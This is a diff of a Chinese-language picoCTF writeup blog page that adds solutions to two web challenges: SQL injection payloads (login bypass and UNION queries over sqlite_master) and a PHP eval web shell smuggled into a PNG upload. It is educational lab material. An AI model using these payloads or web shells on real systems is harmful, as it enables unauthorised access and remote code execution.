@@ -22,16 +22,26 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="前言TODO Webpicobrowser這題我們點進URL後會看到一個FLAG的按鈕，按下去會發現我們不能得到FLAG。他說我們應該要是picobrowser，所以我就寫了一個selenium的Python腳本來運行，看看能不能拿到flag。 123456789101112131415from selenium import webdriverfrom selenium.webdriver.ch">
+        <meta name="description" content="前言其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言XD。總之呢這裡就是會盡量彙整所有的picoCTF的題目在這邊（但是因為已經寫了60題左右才開始打算來寫writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的writeup，就這樣啦！希望能幫忙到你。 Webpicobrowser這題我們點進URL後會看到一個FLAG的按鈕，按下">
 <meta property="og:type" content="article">
 <meta property="og:title" content="All-in-One PicoCTF Writeups">
 <meta property="og:url" content="https://cx330.tw/CyberSec/CTF/All-in-One%20PicoCTF-Writeups/">
 <meta property="og:site_name" content="CX330&#39;s Universe">
-<meta property="og:description" content="前言TODO Webpicobrowser這題我們點進URL後會看到一個FLAG的按鈕，按下去會發現我們不能得到FLAG。他說我們應該要是picobrowser，所以我就寫了一個selenium的Python腳本來運行，看看能不能拿到flag。 123456789101112131415from selenium import webdriverfrom selenium.webdriver.ch">
+<meta property="og:description" content="前言其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言XD。總之呢這裡就是會盡量彙整所有的picoCTF的題目在這邊（但是因為已經寫了60題左右才開始打算來寫writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的writeup，就這樣啦！希望能幫忙到你。 Webpicobrowser這題我們點進URL後會看到一個FLAG的按鈕，按下">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://hackmd.io/_uploads/SJB9S0p70.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BySNOmYUC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1wnu7KIR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJjw6XYUC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BysgmNY8R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyoSNNtLA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkocKNtIA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy7rFrYU0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJo4cSF8A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyahqSYLR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJW1sBtI0.png">
 <meta property="article:published_time" content="2024-06-01T02:27:03.000Z">
-<meta property="article:modified_time" content="2024-06-16T07:59:08.928Z">
+<meta property="article:modified_time" content="2024-06-26T08:44:58.134Z">
 <meta property="article:author" content="CX330">
 <meta property="article:tag" content="CX330, 陳子雋, CX330 universe, CX330 Blog, Blog, CTF, CX330 hacker, hacker">
 <meta name="twitter:card" content="summary">
@@ -697,15 +707,15 @@ mjx-container[display="true"] + br {
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -759,8 +769,8 @@ mjx-container[display="true"] + br {
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-06-16 15:59:08</span>
-            <span class="mobile">2024-06-16 15:59:08</span>
+            <span class="desktop">2024-06-26 16:44:58</span>
+            <span class="mobile">2024-06-26 16:44:58</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -797,12 +807,12 @@ mjx-container[display="true"] + br {
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>2.4k Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.8k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>12 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>17 Mins</span>
         </span>
     
     
@@ -821,12 +831,64 @@ mjx-container[display="true"] + br {
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>TODO</p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="picobrowser"><a href="#picobrowser" class="headerlink" title="picobrowser"></a>picobrowser</h2><p>這題我們點進URL後會看到一個FLAG的按鈕，按下去會發現我們不能得到FLAG。<img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJB9S0p70.png"><br>他說我們應該要是picobrowser，所以我就寫了一個selenium的Python腳本來運行，看看能不能拿到flag。</p>
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言XD。總之呢這裡就是會盡量彙整所有的picoCTF的題目在這邊（但是因為已經寫了60題左右才開始打算來寫writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的writeup，就這樣啦！希望能幫忙到你。</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="picobrowser"><a href="#picobrowser" class="headerlink" title="picobrowser"></a>picobrowser</h2><p>這題我們點進URL後會看到一個FLAG的按鈕，按下去會發現我們不能得到FLAG。<figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJB9S0p70.png" alt="image"><figcaption>image</figcaption></figure><br>他說我們應該要是picobrowser，所以我就寫了一個selenium的Python腳本來運行，看看能不能拿到flag。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">from</span> webdriver_manager.chrome <span class="keyword">import</span> ChromeDriverManager</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">my_user_agent = <span class="string">"picobrowser"</span> <span class="comment"># 這裡把agent改為picobrowser</span></span><br><span class="line">chrome_options = webdriver.ChromeOptions()</span><br><span class="line">chrome_options.add_argument(<span class="string">f"--user-agent=<span class="subst">{my_user_agent}</span>"</span>)</span><br><span class="line">service = Service(executable_path=ChromeDriverManager().install())</span><br><span class="line">driver = webdriver.Chrome(service=service, options=chrome_options)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://jupiter.challenges.picoctf.org/problem/28921/flag"</span></span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line">time.sleep(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure></div>
 <p>這樣就得到flag了！</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}</span><br></pre></td></tr></table></figure></div>
+<h2 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h2><p>把題目launch了之後會進入到一個登入頁面，如下圖。</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BySNOmYUC.png" alt="題目"><figcaption>題目</figcaption></figure></p>
+<p>然後我們先嘗試使用<code>admin</code>作為帳號密碼登入。帳號密碼都輸入<code>admin</code>後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1wnu7KIR.png" alt="image"><figcaption>image</figcaption></figure></p>
+<p>圖片有點小，總之他顯示的內容就是像下面這樣:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br><span class="line">SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'</span><br></pre></td></tr></table></figure></div>
+<p>所以我們在這邊把密碼用<code>'OR 1=1 --</code>這串payload作為輸入（帳號可以隨便輸入），整個SQL的query就會變成這樣:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> password <span class="operator">=</span> <span class="string">''</span><span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--' AND username = 'admin'</span></span><br></pre></td></tr></table></figure></div>
+<p>可以從上面的代碼高亮的顏色發現，在<code>1=1</code>後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJjw6XYUC.png" alt="image"><figcaption>image</figcaption></figure></p>
+<p>他可以查詢City的名稱，但其實一筆資料包含了City, Address, Phone。分析一下後台可能的SQL語句，應該是如下:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> {TABLE_NAME} <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">''</span>;</span><br></pre></td></tr></table></figure></div>
+<p>再來因為題目有告訴我們系統使用的是SQLite，所以會有一個叫做<code>sqlite_master</code>的表來儲存一些表格的各種資訊。（<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/luoshabugui/article/details/108327936">資訊來源 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</p>
+<p>知道這些候我們輸入<code>' UNION SELECT name, sql, 1337 FROM sqlite_master; --</code>讓整個SQL語句變成如下</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> city, address, phone <span class="keyword">FROM</span> {TABLE_NAME} <span class="keyword">WHERE</span> city <span class="operator">=</span> <span class="string">''</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> name, <span class="keyword">sql</span>, <span class="number">1337</span> <span class="keyword">FROM</span> sqlite_master; <span class="comment">--';</span></span><br></pre></td></tr></table></figure></div>
+<p>這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是sqlite_master的表格內容，如下:</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BysgmNY8R.png" alt="image"><figcaption>image</figcaption></figure></p>
+<p>我們可以看到被紅色框框圈住的地方就是我們所想獲得的flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段payload<code>' UNION SELECT 1, flag, 1 FROM more_table; --</code>。輸入後就可以看到以下的介面啦！</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyoSNNtLA.png" alt="image"><figcaption>image</figcaption></figure></p>
+<p>flag就找到囉！</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}</span><br></pre></td></tr></table></figure></div>
 
+<h2 id="Trickster"><a href="#Trickster" class="headerlink" title="Trickster"></a>Trickster</h2><p>這題的題目是一個可以上傳png的網頁，看起來就是文件上船漏洞，頁面如下:</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HkocKNtIA.png" alt="題目"><figcaption>題目</figcaption></figure></p>
+<p><del>秉持著不知道要幹嘛的時候先掃路徑的精神</del>，可以找到它的robots.txt，它其中禁止了兩個路徑，如下:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /instructions.txt</span><br><span class="line">Disallow: /uploads/</span><br></pre></td></tr></table></figure></div>
+<p>既然它都禁止了，我們就去看看吧XD。<code>/uploads/</code>應該就是它的上船後的文件路徑了，而它instructions.txt的內容如下:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Let's create a web app for PNG Images processing.</span><br><span class="line">It needs to:</span><br><span class="line">Allow users to upload PNG images</span><br><span class="line">	look for ".png" extension in the submitted files</span><br><span class="line">	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )</span><br><span class="line">after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.</span><br></pre></td></tr></table></figure></div>
+<p>所以我們知道後端驗證檔案是否為png的方法有二，其一為檢查文件後綴名是否為<code>.png</code>；其二為驗證文件的magic bytes，看文件在十六進制中的前幾個位元組是否為<code>50 4E 47</code>。</p>
+<p>知道了這些信息後，我們先隨便找一張png圖片上傳看看吧！（我這邊直接隨便截圖，並命名為<code>hack.png</code>）。並且在upload的過程中用Burp suite去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為<code>hack.png.php</code>，並在檔案內容的PNG以下添加這個<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6957?time__1311=n4+xnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https://www.google.com/">php一句話木馬 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>整個修改完後如下（點開來看可能會比較清楚）:</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sy7rFrYU0.png" alt="image"><figcaption>image</figcaption></figure></p>
+<p>上傳完成後，現在這個shell就會位於<code>https://my_instance_url/uploads/hack.png.php</code>這個位置上啦。</p>
+<p>接下來再用<a class="link" target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">中國蟻劍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>這款工具去連接那個web shell就可以啦，連接過程如下:</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJo4cSF8A.png" alt="輸入連接資訊"><figcaption>輸入連接資訊</figcaption></figure></p>
+<p>連接完成後，就可以直接看一下網站的文件，看到以下這個<code>.txt</code>應該就是flag了。</p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyahqSYLR.png" alt="貌似是flag的文件"><figcaption>貌似是flag的文件</figcaption></figure></p>
+<p><figure class="image-caption"><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJW1sBtI0.png" alt="flag出來了"><figcaption>flag出來了</figcaption></figure></p>
+<p>於是我們就成功找到了flag啦！如下:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}</span><br></pre></td></tr></table></figure></div>
+<p>這邊補充一個知識點，來講一下<code>&lt;?php @eval($_POST['shell']);?&gt;</code>到底是在做啥。但因為我也不是很熟php，所以我們來看看ChatGPT大神是怎麼回答的吧！</p>
+<blockquote>
+<p>當然，這段PHP代碼的原理是允許遠程執行伺服器上的PHP代碼。這是如何工作的：</p>
+<ol>
+<li><code>&lt;?php</code> 是PHP代碼的開始標記。</li>
+<li><code>@eval($_POST['shell']);</code> 中的 <code>eval()</code> 函數執行傳遞給它的字符串作為PHP代碼。這裡的代碼來自於HTTP POST請求中名為 <code>shell</code> 的變量。</li>
+<li><code>@</code> 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。</li>
+<li>由於這段代碼執行任意PHP代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。</li>
+</ol>
+<p>簡言之，任何通過 <code>shell</code> 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。</p>
+</blockquote>
+<p>然後我後來找到了另一篇writeup，它的payload比較酷，是一個即時執行的input框，有興趣可以去看一下<a class="link" target="_blank" rel="noopener" href="https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18">這篇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
 <h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><blockquote>
 <p><a class="link" target="_blank" rel="noopener" href="https://github.com/CX330Blake/Crypto_Notebook">My scripts &amp; note on Github <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
@@ -891,7 +953,7 @@ mjx-container[display="true"] + br {
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-06-16 15:59:08
+                    :</strong> 2024-06-26 16:44:58
             </li>
         
         <li>
@@ -1036,7 +1098,7 @@ mjx-container[display="true"] + br {
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">All-in-One PicoCTF Writeups</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#picobrowser"><span class="nav-text">picobrowser</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy1"><span class="nav-text">Easy1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Caesar"><span class="nav-text">Caesar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#New-Caesar"><span class="nav-text">New Caesar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mind-your-Ps-and-Qs"><span class="nav-text">Mind your Ps and Qs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-padding-no-problem"><span class="nav-text">No padding, no problem</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-peasy"><span class="nav-text">Easy peasy</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensic"><span class="nav-text">Forensic</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#picobrowser"><span class="nav-text">picobrowser</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#More-SQLi"><span class="nav-text">More SQLi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Trickster"><span class="nav-text">Trickster</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy1"><span class="nav-text">Easy1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Caesar"><span class="nav-text">Caesar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#New-Caesar"><span class="nav-text">New Caesar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mind-your-Ps-and-Qs"><span class="nav-text">Mind your Ps and Qs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-padding-no-problem"><span class="nav-text">No padding, no problem</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easy-peasy"><span class="nav-text">Easy peasy</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensic"><span class="nav-text">Forensic</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a></li></ol>
 
     </div>
 </div>
@@ -1071,11 +1133,11 @@ mjx-container[display="true"] + br {
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        7 posts in total
+                        8 posts in total
                     </span>
                     
                         <span>
-                            7.1k words in total
+                            8.8k words in total
                         </span>
                     
                 </p>
